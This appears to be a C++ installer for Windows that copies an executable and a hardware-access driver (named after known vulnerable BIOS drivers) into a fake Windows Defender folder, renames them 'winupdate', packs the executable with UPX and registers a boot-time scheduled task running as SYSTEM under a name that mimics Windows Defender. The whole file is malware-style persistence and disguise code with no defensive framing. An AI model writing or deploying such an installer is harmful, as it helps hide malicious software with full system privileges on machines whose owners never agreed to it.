#include <windows.h>
#include <string>
#include <cstring>

int main() {
    char ed[MAX_PATH]; GetModuleFileNameA(NULL, ed, MAX_PATH);
    char* p = strrchr(ed, '\\'); if (!p) return 1; *p = 0;

    std::string exeSrc = std::string(ed) + "\\emulator.exe";
    std::string sysSrc = std::string(ed) + "\\BiosToolCommonDriver.sys";
    if (GetFileAttributesA(sysSrc.c_str()) == INVALID_FILE_ATTRIBUTES)
        sysSrc = std::string(ed) + "\\cpqsysio64.sys";
    if (GetFileAttributesA(exeSrc.c_str()) == INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(sysSrc.c_str()) == INVALID_FILE_ATTRIBUTES) {
        printf("Files not found in: %s\n", ed); return 1;
    }

    std::string idir = "C:\\ProgramData\\Microsoft\\WindowsDefender";
    CreateDirectoryA(idir.c_str(), NULL);

    std::string exeDst = idir + "\\winupdate.exe";
    std::string sysDst = idir + "\\winupdate.sys";

    if (!CopyFileA(exeSrc.c_str(), exeDst.c_str(), FALSE)) { printf("exe copy failed\n"); return 1; }
    if (!CopyFileA(sysSrc.c_str(), sysDst.c_str(), FALSE)) { printf("sys copy failed\n"); return 1; }

    std::string upx = std::string(ed) + "\\upx.exe";
    if (!upx.empty() && GetFileAttributesA(upx.c_str()) != INVALID_FILE_ATTRIBUTES) {
        system(("\"" + upx + "\" -9 --force \"" + exeDst + "\" >nul 2>&1").c_str());
    }

    std::string cmd = "schtasks /create /tn \"WindowsDefenderUpdate\" /tr \"\\\"" + exeDst + "\\\" --silent\" /sc onstart /rl highest /ru SYSTEM /f >nul 2>&1";
    system(cmd.c_str());

    printf("Installation complete!\n");
    printf("  Exe: %s\n", exeDst.c_str());
    printf("  Sys: %s\n", sysDst.c_str());
    printf("  Task: WindowsDefenderUpdate (boot, SYSTEM)\n");
    return 0;
}
